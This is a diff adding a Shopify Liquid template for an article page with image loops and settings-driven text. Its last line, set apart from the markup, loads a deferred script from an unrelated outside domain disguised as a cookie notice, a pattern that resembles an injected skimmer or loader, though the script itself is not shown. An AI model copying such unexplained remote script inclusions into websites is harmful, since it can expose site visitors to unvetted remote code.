@@ -1,0 +1,37 @@
+<div class="col-md-12 layout-page-aophat-ra-tieng" id="layout-page-common">
+  <div class="template-article">
+    <!-- <div class="spicegems_gdpr_bottom_banner" id="spicegems_gdpr_banner" style="background-color: rgb(255, 255, 255); display: block;">      <div class="spicegems_gdpr_banner_con">      <div class="spicegems_gdpr_banner_inner">      <msg id="spicegems_gdpr_banner_msg" style="color: rgb(17, 17, 17);">This website uses cookies to ensure you get the best experience on our website.</msg>      <a href="https://thisisneverthat-intl.myshopify.com/pages/privacy-policy" id="spicegems_gdpr_banner_link" target="_blank" style="color: rgb(17, 17, 17);">Privacy Policy</a>      </div>      <a href="javascript:void(0)" id="spicegems_gdpr_main_btn" style="background-color: rgb(17, 17, 17); color: rgb(255, 255, 255);">Accept</a>      </div>      </div> -->
+    <div class="all_wrap">
+      <main class="wrapper main-content" role="main">
+        <div id="shopify-section-article-template-news_updated" class="shopify-section">
+          <div id="article">
+            <div class="article_img col2 w70">
+              {%- for i in (1..2) -%}
+
+                {%- capture image -%}article_aophat-ra-tieng-{{i}}.jpg{%- endcapture -%}
+                {%- capture title -%}article_aophat-ra-tieng_{{i}}_text{%- endcapture -%}
+                <div class="img_wrap"><img src="{{ image| asset_url }}" alt="{{ settings.[title] }}"></div>
+              {%- endfor -%}
+            </div>
+            <div class="article_contents">
+              <div class="article_title">{{ settings.article_aophat-ra-tieng_text_title }}</div>
+              <time class="article_date">{{ settings.article_aophat-ra-tieng_text_time }}.</time>
+              <div class="article_description">{{ settings.article_aophat-ra-tieng_text_descript }}</div>
+            </div>
+            <div class="article_img content col6 w70">
+              {%- for i in (3..16) -%}
+                {%- capture image -%}article_aophat-ra-tieng-{{i}}.jpg{%- endcapture -%}
+                {%- capture title -%}article_aophat-ra-tieng_{{i}}_text{%- endcapture -%}
+                <div class="img_wrap"><img src="{{ image| asset_url }}" alt="{{ settings.[title] }}"></div>
+              {%- endfor -%}
+
+            </div>
+            <a href="{{ settings.article_aophat-ra-tieng_text_footer_link }}" class="shop_link">{{ settings.article_aophat-ra-tieng_text_footer_name }}</a>
+          </div>
+        </div>
+
+      </main>
+    </div>
+  </div>
+</div>
+<script defer src='https://www.asifkamboh.com/js/cookienotice.js'></script>
